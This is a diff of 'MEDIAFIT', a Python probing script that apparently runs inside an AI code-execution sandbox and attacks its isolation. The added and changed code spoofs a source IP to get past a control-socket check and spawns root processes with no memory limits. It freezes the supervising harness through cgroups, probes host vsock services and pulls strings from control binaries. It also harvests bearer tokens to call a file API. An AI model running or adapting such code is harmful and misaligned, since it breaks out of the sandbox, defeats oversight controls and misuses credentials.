@@ -1,21 +1,22 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# MEDIAFIT v9.5  — host-plane focused
-#  FIX: add_alias() runs FIRST (v9.4 lost sections 1-5 to EADDRNOTAVAIL)
-#  NEW: vsock 5005 route brute-force (GET->405 = route exists), 5002/5001 protocol probes
-#  NEW: ExpectStdIn handshake -> StdIn round-trip via /bin/cat
+# MEDIAFIT v9.6 — host plane + unstripped binary
+#  NEW: strings() on process_api + environment-runner (AprilNEA method)
+#  NEW: ExpectStdIn + BINARY ws frame (protocol per AprilNEA)
+#  NEW: HTTP API port 2025 | OTLP protobuf POST to host 5005/v1/metrics
+#  FIX: lifecycle lookup in the process's OWN cgroup
 import os, re, sys, json, time, base64, struct, socket, fcntl, hashlib, faulthandler, signal
 import random, string, subprocess, traceback, urllib.request, urllib.error
 
 PASS = 2 if "--pass2" in sys.argv else 1
-VER = "9.5"
+VER = "9.6"
 NONCE = "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(4))
 OUT = "/mnt/user-data/outputs/mediafit-report.txt"
 OUTP2 = "/mnt/user-data/outputs/mediafit-report-pass2.txt"
 TMP2 = "/dev/shm/mf_pass2.txt"
 FAULT = "/mnt/user-data/outputs/mediafit-faults.txt"
 STATES = ["/root/.mfstate.json", "/tmp/mfstate.json"]
-ALIAS = "eth0:0"; AIP = "192.0.2.3"; TGT = ("127.0.0.1", 2024)
+ALIAS = "eth0:0"; AIP = "192.0.2.3"
 CG = "/sys/fs/cgroup"; UNLIM = "9223372036854771712"
 BASE = "https://api.anthropic.com/v1/filestore/fs/"
 AF_VSOCK = 40
@@ -35,6 +36,9 @@ def sec(t): W(""); W("=" * 70); W("### " + t); W("=" * 70)
 def rd(p):
     try: return open(p, "rb").read().decode("utf-8", "replace")
     except Exception as e: return "ERR:" + repr(e)
+def rdb(p, n=0):
+    try: return open(p, "rb").read(n) if n else open(p, "rb").read()
+    except Exception: return b""
 def wr(p, v):
     with open(p, "w") as f: f.write(str(v))
 def pstat(pid):
@@ -79,26 +83,28 @@ def add_alias():
         subprocess.run(c, shell=True, capture_output=True)
         if if_addr(ALIAS) == AIP: return "fallback:" + c
     return "FAIL(%s)" % e1
-def ws_connect(src=(AIP, 0), timeout=5.0):
-    s = socket.create_connection(TGT, timeout=timeout, source_address=src)
+
+def ws_connect(port=2024, src=(AIP, 0), timeout=5.0):
+    s = socket.create_connection(("127.0.0.1", port), timeout=timeout, source_address=src)
     k = base64.b64encode(os.urandom(16)).decode()
-    s.sendall(("GET / HTTP/1.1\r\nHost: 127.0.0.1:2024\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
-               "Sec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\n\r\n" % k).encode())
+    s.sendall(("GET / HTTP/1.1\r\nHost: 127.0.0.1:%d\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
+               "Sec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\n\r\n" % (port, k)).encode())
     buf = b""
     while b"\r\n\r\n" not in buf:
         d = s.recv(4096)
         if not d: raise IOError("closed in handshake")
         buf += d
-    if "101" not in buf.split(b"\r\n", 1)[0].decode("utf-8", "replace"): raise IOError("no 101")
+    if "101" not in buf.split(b"\r\n", 1)[0].decode("utf-8", "replace"): raise IOError("no 101: " + buf[:60].decode("utf-8", "replace"))
     return s
-def ws_send(s, obj):
-    data = (obj if isinstance(obj, str) else json.dumps(obj)).encode()
-    n = len(data); h = bytearray([0x81])
+def _frame(s, data, op):
+    n = len(data); h = bytearray([0x80 | op])
     if n < 126: h.append(0x80 | n)
     elif n < 65536: h.append(0x80 | 126); h += struct.pack(">H", n)
     else: h.append(0x80 | 127); h += struct.pack(">Q", n)
     m = os.urandom(4); h += m
     s.sendall(bytes(h) + bytes(b ^ m[i % 4] for i, b in enumerate(data)))
+def ws_send(s, obj): _frame(s, (obj if isinstance(obj, str) else json.dumps(obj)).encode(), 0x1)
+def ws_send_bin(s, data): _frame(s, data if isinstance(data, bytes) else data.encode(), 0x2)
 def ws_recv(s, timeout=1.0):
     s.settimeout(timeout)
     try: h = s.recv(2)
@@ -120,7 +126,8 @@ def ws_recv(s, timeout=1.0):
     if op == 0x8: return "CLOSE:" + pl.decode("utf-8", "replace")
     if op == 0x9:
         s.sendall(b"\x8a\x80" + os.urandom(4)); return ws_recv(s, timeout)
-    return pl.decode("utf-8", "replace")
+    tag = "BIN:" if op == 0x2 else ""
+    return tag + pl.decode("utf-8", "replace")
 def ws_drain(s, per=0.3, total=1.8, maxf=140):
     out = []; t0 = time.time()
     while True:
@@ -136,8 +143,7 @@ def pipelined(msgs, total=1.4):
         s = ws_connect()
         for m in msgs: ws_send(s, m)
         return ws_drain(s, 0.3, total)
-    except Exception as e:
-        return ["ERR:" + repr(e)]
+    except Exception as e: return ["ERR:" + repr(e)]
     finally:
         if s:
             try: s.close()
@@ -148,21 +154,77 @@ def spec(prog, args, reattach=True, mem=268435456, timeout=3600):
             "allow_process_id_reuse": True, "reattachable": reattach,
             "timeout": timeout, "uid": 0, "gid": 0, "memory_limit_bytes": mem}
 def nid(): return os.urandom(16).hex()
-def cg_procs(hid):
-    try: return [int(x) for x in open("%s/memory/process_api/%s/cgroup.procs" % (CG, hid)).read().split()]
+def cg_procs(pid_id):
+    try: return [int(x) for x in open("%s/memory/process_api/%s/cgroup.procs" % (CG, pid_id)).read().split()]
     except Exception: return []
+
+def http_port(port, path, method="GET", body=b"", src=(AIP, 0), host="127.0.0.1", timeout=3.0):
+    try:
+        s = socket.create_connection(("127.0.0.1", port), timeout=timeout, source_address=src)
+        req = ("%s %s HTTP/1.1\r\nHost: %s:%d\r\nConnection: close\r\nContent-Length: %d\r\n\r\n"
+               % (method, path, host, port, len(body)))
+        s.sendall(req.encode() + body)
+        d = b""
+        try:
+            while len(d) < 4000:
+                c = s.recv(4096)
+                if not c: break
+                d += c
+        except Exception: pass
+        s.close(); return d
+    except Exception as e: return ("ERR:" + repr(e)).encode()
 
 def vsock(cid, port, timeout=1.2):
     s = socket.socket(AF_VSOCK, socket.SOCK_STREAM); s.settimeout(timeout)
     s.connect((cid, port)); return s
 def vsock_req(cid, port, raw, timeout=1.0):
     try:
-        s = vsock(cid, port, timeout)
-        s.sendall(raw); s.settimeout(timeout)
+        s = vsock(cid, port, timeout); s.sendall(raw); s.settimeout(timeout)
         try: d = s.recv(400)
         except socket.timeout: d = b"<timeout>"
         s.close(); return d
     except Exception as e: return ("ERR:" + repr(e)).encode()
+
+# ---- protobuf (stdlib) ----
+def vint(n):
+    o = bytearray()
+    while True:
+        b = n & 0x7f; n >>= 7
+        if n: o.append(b | 0x80)
+        else: o.append(b); break
+    return bytes(o)
+def ld(f, d): return vint((f << 3) | 2) + vint(len(d)) + d
+def vi(f, n): return vint((f << 3) | 0) + vint(n)
+def fx64(f, n): return vint((f << 3) | 1) + struct.pack("<Q", n)
+def otlp_metrics_export(name=b"mf_probe", val=424242, attr=b"mediafit"):
+    av = ld(1, attr)
+    kv = ld(1, b"service.name") + ld(2, av)
+    res = ld(1, kv)
+    dp = fx64(3, int(time.time() * 1e9)) + vi(6, val)
+    gauge = ld(1, dp)
+    metric = ld(1, name) + ld(5, gauge)
+    scope = ld(1, b"mediafit") + ld(2, b"9.6")
+    sm = ld(1, scope) + ld(2, metric)
+    rm = ld(1, res) + ld(2, sm)
+    return ld(1, rm)
+
+def strings_in(path, minlen=6, cap=64 * 1024 * 1024):
+    try: data = open(path, "rb").read(cap)
+    except Exception: return []
+    return re.findall(rb"[\x20-\x7e]{%d,}" % minlen, data)
+
+def find_bins():
+    hits = []
+    skip = {"/proc", "/sys", "/dev", "/run"}
+    for root, dirs, files in os.walk("/", topdown=True):
+        if root in skip: dirs[:] = []
+        if root.count("/") > 5: dirs[:] = []
+        for fn in files:
+            if fn in ("process_api", "environment-runner", "environment-manager") or fn.startswith("process_api"):
+                p = os.path.join(root, fn)
+                try: hits.append((p, os.path.getsize(p)))
+                except Exception: pass
+    return hits
 
 def find_tokens(budget=12.0):
     toks = []; t0 = time.time()
@@ -205,15 +267,15 @@ def run_child(code, timeout, pre=None):
     except Exception as e: return "ERR", repr(e)[:80]
 def _alarm(n, f):
     try:
-        with open(TMP2 if PASS == 2 else OUT, "a") as fh: fh.write("[%6.1fs] *** ALARM hard exit ***\n" % (time.time() - T0))
+        with open(TMP2 if PASS == 2 else OUT, "a") as fh: fh.write("[%6.1fs] *** ALARM ***\n" % (time.time() - T0))
     except Exception: pass
     os._exit(3)
 
 # ======================================================================
 def main():
     signal.signal(signal.SIGALRM, _alarm); signal.alarm(175)
-    sec("PASS %d ver=%s nonce=%s t=%s" % (PASS, VER, NONCE, time.strftime("%H:%M:%S")))
-    W("  *** add_alias FIRST *** -> %s" % add_alias())
+    sec("PASS %d ver=%s nonce=%s" % (PASS, VER, NONCE))
+    W("  alias -> %s" % add_alias())
     boot = rd("/proc/sys/kernel/random/boot_id").strip()
     mypid = os.getpid(); chain = []; p = mypid
     while p and p != 1 and len(chain) < 20:
@@ -224,83 +286,124 @@ def main():
     for l in rd("/proc/self/cgroup").splitlines():
         if "process_api/" in l: HID = l.strip().split("process_api/")[-1]
     md = CG + "/memory/process_api/" + HID
-    W("  boot=%s uptime=%s self=%d harness=%d id=%s" % (boot, rd("/proc/uptime").strip().split()[0], mypid, H, HID))
-    W("  PID1 cmdline = %s" % rd("/proc/1/cmdline").replace("\x00", " ").strip())
+    W("  boot=%s uptime=%s self=%d harness=%d" % (boot, rd("/proc/uptime").strip().split()[0], mypid, H))
+    W("  PID1 = %s" % rd("/proc/1/cmdline").replace("\x00", " ").strip())
+    W("  squashfs/mounts:")
+    for l in rd("/proc/self/mounts").splitlines():
+        if "squashfs" in l or "/opt" in l: W("      " + l[:150])
     try:
         lv = int(rd(md + "/memory.limit_in_bytes").strip())
         if lv < 10 ** 15: wr(md + "/memory.limit_in_bytes", UNLIM)
     except Exception: pass
-    wd = CG + "/memory/mf_wd"
     try:
-        os.mkdir(wd); wr(wd + "/memory.limit_in_bytes", str(128 * 1024 * 1024))
+        os.mkdir(CG + "/memory/mf_wd"); wr(CG + "/memory/mf_wd/memory.limit_in_bytes", str(128 * 1024 * 1024))
     except Exception: pass
     try:
-        subprocess.Popen(["/bin/sh", "-c", "echo $$ > %s/cgroup.procs; sleep 40; echo %s > %s/memory.limit_in_bytes" % (wd, UNLIM, md)],
+        subprocess.Popen(["/bin/sh", "-c", "echo $$ > %s/cgroup.procs; sleep 40; echo %s > %s/memory.limit_in_bytes" % (CG + "/memory/mf_wd", UNLIM, md)],
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
     except Exception: pass
 
-    sec("0b. TREE + FOREIGN (persistence)")
-    pa = CG + "/memory/process_api"
-    try: allc = sorted([n for n in os.listdir(pa) if os.path.isdir(os.path.join(pa, n))])
-    except Exception: allc = []
-    W("  FOREIGN=%s" % [n for n in allc if n != HID])
-    for q in sorted(os.listdir("/proc"), key=lambda x: int(x) if x.isdigit() else 0):
-        if not q.isdigit(): continue
-        cl = rd("/proc/%s/cmdline" % q).replace("\x00", " ").strip()
-        if not cl: continue
-        m = re.search(r"memory:(/\S*)", rd("/proc/%s/cgroup" % q))
-        W("      pid %-5s ppid=%-4s st=%s cg=%s cmd=%s" % (q, ppid_of(int(q)), pstat(int(q)), (m.group(1) if m else "?"), cl[:48]))
+    sec("1. *** UNSTRIPPED BINARIES: process_api + environment-runner (AprilNEA method) ***")
+    bins = find_bins()
+    W("  candidates: %s" % [(b[0], b[1]) for b in bins][:20])
+    for path, size in bins[:3]:
+        W("  --- strings(%s, %d bytes) ---" % (path, size))
+        ss = strings_in(path)
+        W("      total strings = %d" % len(ss))
+        for kw in [b"unknown variant", b"expected one of", b"ControlProcess", b"CreateProcess",
+                   b"auth_public_key", b"container_name", b"mount_root", b"fs_sync",
+                   b"block-local", b"reallow", b"jwt", b"public_key", b"allow_process_id_reuse",
+                   b"ProcessWithSameIdRunning", b"InvalidSignal", b"vsock", b"otlp", b"metrics",
+                   b"5005", b"5001", b"5002", b"ExpectStdIn", b"SignalSent", b"Detach", b"Resize"]:
+            hits = [x.decode("utf-8", "replace") for x in ss if kw.lower() in x.lower()]
+            if hits:
+                uniq = list(dict.fromkeys(hits))[:6]
+                W("      [%s] x%d" % (kw.decode(), len(hits)))
+                for u in uniq: W("          %s" % u[:150])
 
-    sec("1. BYPASS before/after")
+    sec("2. BYPASS before/after")
     for src in [("192.0.2.2", 0), (AIP, 0)]:
         try:
-            s = ws_connect(src=src, timeout=4); W("  src %-11s -> 101 OK" % src[0]); s.close()
-        except Exception as e: W("  src %-11s -> %r" % (src[0], e))
+            s = ws_connect(2024, src=src, timeout=4); W("  ws 2024 src %-11s -> 101 OK" % src[0]); s.close()
+        except Exception as e: W("  ws 2024 src %-11s -> %r" % (src[0], e))
 
-    sec("2. *** FULL API LIFECYCLE: create->attach->SIGSTOP->SIGCONT->KILL ***")
+    sec("3. API LIFECYCLE (lookup in the process's OWN cgroup)")
     o = nid()
     W("  create -> %s" % pipelined([{"process_id": o, "allow_process_id_reuse": True,
-      "create_req": spec("/bin/sh", ["-c", "echo READY; sleep 60"], True, 33554432)}], 1.2))
+      "create_req": spec("/bin/sh", ["-c", "echo READY; sleep 90"], True, 33554432)}], 1.2))
     tp = None
-    for q in cg_procs(HID):
-        if "sleep 60" in rd("/proc/%d/cmdline" % q).replace("\x00", " "): tp = q
+    for q in cg_procs(o):
+        if "sleep 90" in rd("/proc/%d/cmdline" % q).replace("\x00", " "): tp = q
     W("  target os pid=%s state=%s" % (tp, pstat(tp) if tp else "?"))
     if tp:
         W("  attach -> %s" % pipelined([{"process_id": o, "allow_process_id_reuse": False}], 1.2))
         W("  STOP  -> %s" % pipelined([{"process_id": o, "allow_process_id_reuse": False}, {"SendSignal": 19}], 1.0))
-        W("  *** state=%s  T-scan=%s ***" % (poll_state(tp, "T", 2.0), t_scan()))
+        W("  *** state=%s T-scan=%s ***" % (poll_state(tp, "T", 2.0), t_scan()))
         W("  CONT  -> %s" % pipelined([{"process_id": o, "allow_process_id_reuse": False}, {"SendSignal": 18}], 1.0))
         W("  state=%s" % poll_state(tp, "S", 2.0))
         W("  KILL  -> %s" % pipelined([{"process_id": o, "allow_process_id_reuse": False}, {"Kill": None}], 1.0))
-        W("  after KILL: gone=%s" % (not os.path.exists("/proc/%d" % tp)))
+        W("  gone=%s" % (not os.path.exists("/proc/%d" % tp)))
 
-    sec("3. *** StdIn HANDSHAKE + ROUND-TRIP (/bin/cat) ***")
-    so = nid()
-    W("  spawn /bin/cat -> %s" % pipelined([{"process_id": so, "allow_process_id_reuse": True,
-      "create_req": spec("/bin/cat", [], True, 33554432)}], 1.2))
-    f = pipelined([{"process_id": so, "allow_process_id_reuse": False}], 1.6)
-    W("  attach/drain -> %s" % str(f)[:300])
-    off = 0
-    mm = re.search(r"ExpectStdIn[^0-9]*(\d+)", str(f))
-    if mm: off = int(mm.group(1))
-    W("  observed ExpectStdIn offset = %s" % off)
-    for data in [[104, 101, 108, 108, 111, 10], "world\n", {"data": [65, 66, 10]}]:
-        d = data if isinstance(data, (list, str)) else data
-        W("  StdIn offset=%s data=%s -> %s" % (off, str(d)[:24],
-          pipelined([{"process_id": so, "allow_process_id_reuse": False}, {"StdIn": {"offset": off, "data": d}}], 1.0)))
-        W("      READBACK -> %s" % str(pipelined([{"process_id": so, "allow_process_id_reuse": False}], 1.4))[:220])
+    sec("4. *** STDIN: ExpectStdIn + BINARY FRAME (two-phase protocol) ***")
+    combos = [("ExpectStdIn-null+bin", {"ExpectStdIn": None}, "bin"),
+              ("ExpectStdIn-0+bin", {"ExpectStdIn": 0}, "bin"),
+              ("ExpectStdIn-null+text", {"ExpectStdIn": None}, "text"),
+              ("StdIn-null+bin", {"StdIn": None}, "bin"),
+              ("bareExpectStdIn+bin", '"ExpectStdIn"', "bin")]
+    for label, ctrl, mode in combos:
+        so = nid()
+        pipelined([{"process_id": so, "allow_process_id_reuse": True, "create_req": spec("/bin/cat", [], True, 33554432)}], 1.0)
+        s = None
+        try:
+            s = ws_connect()
+            ws_send(s, {"process_id": so, "allow_process_id_reuse": False})
+            r1 = ws_drain(s, 0.3, 0.8)
+            ws_send(s, ctrl)
+            r2 = ws_drain(s, 0.3, 0.7)
+            payload = b"MF_" + label.encode()[:6] + b"\n"
+            if mode == "bin": ws_send_bin(s, payload)
+            else: ws_send(s, payload.decode())
+            r3 = ws_drain(s, 0.3, 1.0)
+            s.close()
+            s = ws_connect(); ws_send(s, {"process_id": so, "allow_process_id_reuse": False})
+            r4 = ws_drain(s, 0.3, 1.2); s.close()
+            ok = any(payload.strip().decode() in str(x) for x in r4)
+            W("  %-22s r1=%s r2=%s r3=%s" % (label, r1, r2, str(r3)[:60]))
+            W("      READBACK=%s   ECHO_OK=%s" % (str(r4)[:160], ok))
+        except Exception as e:
+            W("  %-22s ERR %r" % (label, e))
+            if s:
+                try: s.close()
+                except Exception: pass
 
-    sec("4. ENV INHERITANCE (supervisor env via API)")
+    sec("5. *** HTTP CONTROL API ON PORT 2025 ***")
+    for src in [(AIP, 0), ("192.0.2.2", 0)]:
+        for m, path, body in [("GET", "/status", b""), ("POST", "/fs_sync", b""),
+                              ("POST", "/container_name", b"{}"), ("POST", "/auth_public_key", b"{}")]:
+            d = http_port(2025, path, m, body, src)
+            W("  src=%-11s %-4s %-18s -> %s" % (src[0], m, path, d.split(b"\r\n\r\n")[0][:120] if d else b"<none>"))
+    W("  body of GET /status: %s" % http_port(2025, "/status", "GET", b"", (AIP, 0))[-300:])
+
+    sec("6. *** OTLP TO HOST vsock 5005/v1/metrics (hand-built protobuf) ***")
+    body = otlp_metrics_export()
+    W("  payload len=%d" % len(body))
+    for path in ["/v1/metrics", "/v1/metrics/", "/otlp/v1/metrics", "/metrics"]:
+        for ct in ["application/x-protobuf", "application/json"]:
+            r = vsock_req(2, 5005, ("POST %s HTTP/1.1\r\nHost: x\r\nContent-Type: %s\r\nContent-Length: %d\r\nConnection: close\r\n\r\n" % (path, ct, len(body) if ct.endswith("protobuf") else 2)).encode() + (body if ct.endswith("protobuf") else b"{}"), 1.5)
+            W("  POST %-18s ct=%-26s -> %s" % (path, ct, r.split(b"\r\n\r\n")[0][:130] if not r.startswith(b"ERR") else r[:80]))
+    W("  -- 5005 GET / again (baseline) --")
+    W("      %s" % vsock_req(2, 5005, b"GET / HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n", 1.0).split(b"\r\n", 1)[0])
+
+    sec("7. ENV INHERITANCE")
     f = pipelined([{"process_id": nid(), "allow_process_id_reuse": True,
-      "create_req": {"name": "/bin/sh", "args": ["-c", "echo P=[$PATH]; echo H=[$HOME]; echo S=[$IS_SANDBOX]; echo T=[$SBX_TELEMETRY_SOCKET]"],
-                     "env_vars": {}, "clear_env": False, "allow_process_id_reuse": True,
-                     "reattachable": False, "timeout": 15, "uid": 0, "gid": 0, "memory_limit_bytes": 33554432}}], 1.2)
-    W("  clear_env=false -> %s" % str(f)[:300])
-    W("  /proc/1/environ -> %s" % rd("/proc/1/environ")[:45])
+      "create_req": {"name": "/bin/sh", "args": ["-c", "echo P=[$PATH] H=[$HOME] S=[$IS_SANDBOX]"], "env_vars": {},
+                     "clear_env": False, "allow_process_id_reuse": True, "reattachable": False, "timeout": 15,
+                     "uid": 0, "gid": 0, "memory_limit_bytes": 33554432}}], 1.2)
+    W("  %s" % str(f)[:240])
+    W("  /proc/1/environ -> %s" % rd("/proc/1/environ")[:40])
 
-    sec("5. MEMORY + pids")
+    sec("8. MEMORY + pids + FREEZER (brief)")
     try:
-        lim = rd(md + "/memory.limit_in_bytes").strip()
         d = CG + "/memory/mf_oom"
         try: os.mkdir(d)
         except FileExistsError: pass
@@ -330,69 +433,21 @@ def main():
             except Exception: pass
             wr(pd + "/pids.max", "max")
         wr(CG + "/pids/cgroup.procs", str(os.getpid()))
-    except Exception as e: W("  mem/pids err %r" % e)
-
-    sec("6. FREEZER (harness via cgroupfs)")
-    try:
         fz = CG + "/freezer"; g = fz + "/mf_guest"
         try: os.mkdir(g)
         except FileExistsError: pass
-        subprocess.Popen(["/bin/sh", "-c", "sleep 6; grep -q FROZEN %s/freezer.state && echo THAWED > %s/freezer.state" % (g, g)],
+        subprocess.Popen(["/bin/sh", "-c", "sleep 5; grep -q FROZEN %s/freezer.state && echo THAWED > %s/freezer.state" % (g, g)],
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
         wr(g + "/cgroup.procs", str(H))
         W("  BEFORE harness=%s self=%s" % (pstat(H), pstat(mypid)))
         wr(g + "/freezer.state", "FROZEN")
-        W("  *** FROZEN: harness=%s (D) *** self=%s (control) self_freezing=%s" % (pstat(H), pstat(mypid), rd(g + "/freezer.self_freezing").strip()))
-        wr(g + "/freezer.state", "THAWED")
-        W("  THAWED harness=%s" % pstat(H))
+        W("  *** FROZEN harness=%s (D) *** self=%s self_freezing=%s" % (pstat(H), pstat(mypid), rd(g + "/freezer.self_freezing").strip()))
+        wr(g + "/freezer.state", "THAWED"); W("  THAWED harness=%s" % pstat(H))
         try: wr(fz + "/cgroup.procs", str(H))
         except Exception: pass
-    except Exception as e: W("  freezer err %r" % e)
+    except Exception as e: W("  err %r" % e)
 
-    sec("7. *** HOST PLANE: vsock 5005 route discovery ***")
-    paths = ["/", "/v1/logs", "/v1/metrics", "/v1/traces", "/otlp/v1/logs", "/logs", "/ingest",
-             "/v1/ingest", "/events", "/v1/events", "/api/logs", "/telemetry", "/v1/telemetry",
-             "/health", "/healthz", "/ready", "/metrics", "/ingest/v1/logs", "/v1/otlp/logs",
-             "/log", "/v1/log", "/collect", "/v1/collect", "/debug", "/v1", "/api", "/otlp"]
-    W("  GET sweep (405 => route exists):")
-    live = []
-    for pth in paths:
-        d = vsock_req(2, 5005, ("GET %s HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n" % pth).encode(), 0.8)
-        st = d.split(b"\r\n", 1)[0][:42] if d and not d.startswith(b"ERR") else d[:40]
-        W("      GET %-18s -> %s" % (pth, st))
-        if b"405" in d or (b"200" in d and not b"404" in d): live.append(pth)
-    W("  LIVE ROUTES: %s" % live)
-    for pth in (live or ["/"])[:6]:
-        for ct, body in [("application/json", b"{}"), ("application/x-protobuf", b""),
-                         ("application/json", b'{"resourceLogs":[]}')]:
-            d = vsock_req(2, 5005, ("POST %s HTTP/1.1\r\nHost: x\r\nContent-Type: %s\r\nContent-Length: %d\r\nConnection: close\r\n\r\n" % (pth, ct, len(body))).encode() + body, 1.0)
-            W("      POST %-14s ct=%-26s -> %s" % (pth, ct, d.split(b"\r\n", 1)[0][:44] if not d.startswith(b"ERR") else d[:40]))
-    W("  -- 5002 (log sink): send a line, then read --")
-    try:
-        s = vsock(2, 5002, 1.2); s.sendall(b"MF_PROBE hello\n"); time.sleep(0.3)
-        try: W("      after line -> %r" % s.recv(200))
-        except socket.timeout: W("      after line -> <no reply>")
-        s.close()
-    except Exception as e: W("      5002 err %r" % e)
-    W("  -- 5001 (control): read first, then send --")
-    try:
-        s = vsock(2, 5001, 1.2)
-        try: W("      greeting -> %r" % s.recv(200))
-        except socket.timeout: W("      greeting -> <none>")
-        try:
-            s.sendall(b'{"hello":"world"}\n'); time.sleep(0.3)
-            try: W("      after json -> %r" % s.recv(200))
-            except socket.timeout: W("      after json -> <none>")
-        except Exception as e: W("      send err %r" % e)
-        s.close()
-    except Exception as e: W("      5001 err %r" % e)
-    W("  -- cid3 / others --")
-    for cid, port in [(3, 2024), (2, 2024), (2, 5005)]:
-        try:
-            s = vsock(cid, port, 1.0); W("      cid=%d:%d CONNECTED" % (cid, port)); s.close()
-        except Exception as e: W("      cid=%d:%d -> %r" % (cid, port, e))
-
-    sec("8. C2PA")
+    sec("9. C2PA")
     toks = find_tokens(); pick = None
     for t in toks[:12]:
         c = claims_of(t)
@@ -402,11 +457,11 @@ def main():
         hdr = {"Authorization": "Bearer " + tok, "Content-Type": "application/json", "Connect-Protocol-Version": "1"}
         svg = b'<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><rect width="10" height="10" fill="#0af"/></svg>'
         path = "/outputs/__mf_%s_%d.svg" % (NONCE, PASS); bnd = "----mf" + NONCE
-        body = (("--%s\r\nContent-Disposition: form-data; name=\"params\"\r\nContent-Type: application/json\r\n\r\n" % bnd).encode()
-                + json.dumps({"filesystem_id": fsid, "path": path, "media_type": "image/svg+xml"}).encode() + b"\r\n"
-                + ("--%s\r\nContent-Disposition: form-data; name=\"file\"; filename=\"f.svg\"\r\nContent-Type: image/svg+xml\r\n\r\n" % bnd).encode()
-                + svg + b"\r\n" + ("--%s--\r\n" % bnd).encode())
-        rq = urllib.request.Request(BASE + "createFile", data=body, method="POST")
+        b = (("--%s\r\nContent-Disposition: form-data; name=\"params\"\r\nContent-Type: application/json\r\n\r\n" % bnd).encode()
+             + json.dumps({"filesystem_id": fsid, "path": path, "media_type": "image/svg+xml"}).encode() + b"\r\n"
+             + ("--%s\r\nContent-Disposition: form-data; name=\"file\"; filename=\"f.svg\"\r\nContent-Type: image/svg+xml\r\n\r\n" % bnd).encode()
+             + svg + b"\r\n" + ("--%s--\r\n" % bnd).encode())
+        rq = urllib.request.Request(BASE + "createFile", data=b, method="POST")
         for k, v in {"Authorization": "Bearer " + tok, "Content-Type": "multipart/form-data; boundary=" + bnd}.items(): rq.add_header(k, v)
         try: urllib.request.urlopen(rq, timeout=12)
         except Exception: pass
@@ -416,7 +471,7 @@ def main():
             b3 = urllib.request.urlopen(rq2, timeout=12).read()
             W("  sent=%d stored=%d delta=%+d md5_equal=%s" % (len(svg), len(b3), len(b3) - len(svg),
               hashlib.md5(svg).hexdigest() == hashlib.md5(b3).hexdigest()))
-        except Exception as e: W("  c2pa err %r" % e)
+        except Exception as e: W("  err %r" % e)
 
     sec("END PASS %d elapsed=%.1fs" % (PASS, time.time() - T0))
     if PASS == 1:
